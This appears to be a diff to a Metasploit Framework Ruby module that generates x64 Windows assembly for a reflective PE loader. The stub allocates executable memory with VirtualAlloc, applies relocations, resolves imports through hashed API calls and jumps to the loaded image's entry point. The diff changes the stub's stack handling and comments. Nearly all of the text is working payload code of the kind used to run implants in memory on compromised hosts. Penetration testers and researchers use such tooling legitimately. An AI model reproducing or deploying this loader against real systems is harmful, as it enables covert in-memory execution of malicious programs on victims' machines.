@@ -19,24 +19,23 @@ module Msf
 
       %^
 stub:
-	cld                             ; Clear direction flags
-	pop rsi                         ; Get the address of image to rsi
+  pop rsi                         ; Get the address of image to rsi
 	call $+5                        ; Push the current RIP value to stack
+  cld                             ; Clear direction flags
 	sub [rsp],rsi                   ; Subtract the address of pre mapped PE image and get the image_size+8 to ST[0]
-	call start                      ; Call start
-	#{asm_block_api}
-start:                            ;
-	pop rbp                         ; Get the address of block_api to rbp
-	mov eax,dword [rsi+0x3C]        ; Get the offset of "PE" to eax
+  mov rbp,rsp                     ; Copy current stack address to rbp
+  and rbp,-0x1000                 ; Create a new shadow stack address
+  mov eax,dword [rsi+0x3C]        ; Get the offset of "PE" to eax
 	mov rbx,qword [rax+rsi+0x30]    ; Get the image base address to rbx
 	mov r12d,dword [rax+rsi+0x28]   ; Get the address of entry point to r12
 	mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
 	mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
 	mov rdx,[rsp]                   ; dwSize
 	xor rcx,rcx                     ; lpAddress
+  xchg rsp,rbp                    ; Swap shadow stack
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
-	call rbp                        ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-	add rsp,0x20                    ; Clear stack
+	call api_call                   ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	xchg rsp,rbp                    ; Swap shadow stack
 	mov rdi,rax                     ; Save the new base address to rdi
 	xor rax,rax                     ; Zero out the RAX
 	xor r8,r8                       ; Zero out the R8
@@ -65,7 +64,7 @@ fix:
 	jz get_rva                      ; If yes set the next block RVA
 	mov r8w,word [rax]              ; Move the reloc desc to r8w
 	cmp r8w, 0x00                   ; Check if it is a padding word
-	je pass
+	je pass                         ; Pass padding bytes
 	and r8w,0x0FFF                  ; Get the last 12 bits
 	add r8d,r13d                    ; Add block RVA to desc value
 	add r8,rsi                      ; Add the start address of the image
@@ -76,8 +75,9 @@ pass:
 	xor r8,r8                       ; Zero out r8
 	jmp fix                         ; Loop
 reloc_fin:                        ; All done !
-	xor r14,r14
-	xor r15,r15
+	xor r14,r14                     ; Zero out r14
+	xor r15,r15                     ; Zero out r15
+  xor rcx,rcx                     ; Zero out rcx
 	mov eax,dword [rsi+0x3C]        ; Offset to IMAGE_NT_HEADER ("PE")
 	mov eax,dword [rax+rsi+0x90]    ; Import table RVA
 	add rax,rsi                     ; Import table memory address (first image import descriptor)
@@ -85,15 +85,15 @@ reloc_fin:                        ; All done !
 get_modules:
 	cmp dword [rax],0               ; Check if the import names table RVA is NULL
 	jz complete                     ; If yes building process is done
-	mov eax,dword [rax+0x0C]        ; Get RVA of dll name to eax
-	add rax,rsi                     ; Get the dll name address
+	mov ecx,dword [rax+0x0C]        ; Get RVA of dll name to eax
+	add rcx,rsi                     ; Get the dll name address
 	call LoadLibraryA               ; Load the library
 	mov r13,rax                     ; Move the dll handle to R13
 	mov rax,[rsp]                   ; Move the address of current _IMPORT_DESCRIPTOR to eax
 	call get_procs                  ; Resolve all windows API function addresses
 	add dword [rsp],0x14            ; Move to the next import descriptor
 	mov rax,[rsp]                   ; Set the new import descriptor address to eax
-	jmp get_modules
+	jmp get_modules                 ; Get other modules
 get_procs:
 	mov r14d,dword [rax+0x10]       ; Save the current import descriptor IAT RVA
 	add r14,rsi                     ; Get the IAT memory address
@@ -124,22 +124,23 @@ all_resolved:
 	mov qword [r14],0x00            ; Insert a NULL dword
 	ret                             ; <-
 LoadLibraryA:
-	mov rcx,rax                     ; Move the address of library name string to RCX
+	;mov rcx,rax                     ; Move the address of library name string to RCX
+  xchg rbp,rsp                     ; Swap shadow stack
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-	call rbp                        ; LoadLibraryA(RCX)
-	add rsp,32                      ; Fix the stack
-	ret                             ; <-
+	call api_call                   ; LoadLibraryA(RCX)
+	xchg rbp,rsp                    ; Swap shadow stack
+  ret                             ; <-
 GetProcAddress:
+  xchg rbp,rsp                    ; Swap shadow stack
 	mov rcx,r13                     ; Move the module handle to RCX as first parameter
 	mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
-	call rbp                        ; GetProcAddress(ebx,[esp+4])
-	add rsp,32                      ; Fix the stack
-	ret                             ; <-
+	call api_call                   ; GetProcAddress(ebx,[esp+4])
+	xchg rbp,rsp                    ; Swap shadow stack
+  ret                             ; <-
 complete:
 	pop rax                         ; Clean out the stack
 	pop rcx                         ; Pop the ImageSize into RCX
-  push rcx                        ; Save ImageSize to stack
   push rdi                        ; Save ImageBase to stack
 	mov r13,rdi                     ; Copy the new base value to r13
 	add r13,r12                     ; Add the address of entry value to new base address
@@ -151,31 +152,21 @@ memcpy:
 	inc rdi                         ; Increase image base index
 	loop memcpy                     ; Loop until zero
 PE_start:
+  pop r13                         ; Pop the image base to r13
   or rcx,-1                       ; hProcess
   xor rdx,rdx                     ; lpBaseAddress
   xor r8,r8                       ; hProcess
+  xchg rbp,rsp                    ; Swap shadow stack
   mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'FlushInstructionCache')}
   call api_call                   ; FlushInstructionCache(0xffffffff,NULL,NULL);
-  add rsp,16                      ; Clean stack
-  mov r9,r13                      ; Set AOE to R9
-  mov rdx,r13                     ; Set AOE to RDX
-  pop r13                         ; Set R8 to ImageBase
-  mov rax,0x0000010800000000      ; Nessessary buffer space for process creation
-  push rax                        ; Put to stack
-  mov rax,0xffffffffffffffff      ; Tamper space
-  push rax                        ; Put to stack
-  lea rcx,[rsp+8]                 ; Get nessasary buffer address
-  push 0x00                       ; Put empty stack param
-  push 0x00                       ; Put empty stack param
-  push 0x00                       ; Put empty stack param
-  push 0x00                       ; Put empty stack param
-  push 0x00                       ; Put empty stack param
-  push 0x00                       ; Put empty stack param
   #{prologue}
-  call r9                         ; Call the AOE
+  add r13,r12                     ; Add the address of entry value to image base
+  call r13                        ; Call the AOE
+  and rsp,-0x10                   ; Align stack
   mov rcx,0x00                    ; dwExitCode
   mov r10d,#{'0x%.8x' % Msf::Payload::Windows.exit_types[opts[:exitfunk]]}
   call api_call                   ; Call exit funk based on exit_type
+  #{asm_block_api}
       ^
     end
   end
